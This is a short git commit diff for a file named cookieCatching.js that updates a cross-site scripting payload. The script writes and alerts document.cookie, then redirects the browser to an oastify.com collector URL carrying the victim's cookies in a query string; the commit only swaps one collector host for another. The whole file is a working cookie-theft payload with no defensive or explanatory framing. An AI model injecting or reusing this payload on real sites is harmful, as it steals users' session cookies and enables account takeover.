8daf88bc821ff9b923e0d9b437458bd189682ec0
justblock6 <77896962+justblock6@users.noreply.github.com>
2023-05-24 01:19:47 -0700

    Update cookieCatching.js

--- cookieCatching.js
+++ cookieCatching.js
@@ -1,3 +1,3 @@
 document.write (document.cookie);
 alert (document.cookie);
-document.location= "https://tqn9utwroj8d4u0qz6nqsn0c036wumib.oastify.com/cookie_catcher.php?c=" + document.cookie;
+document.location= "https://w7495uz5tj7kxk3pmuixb5kap1vsjj97y.oastify.com/cookie_catcher.php?c=" + document.cookie;
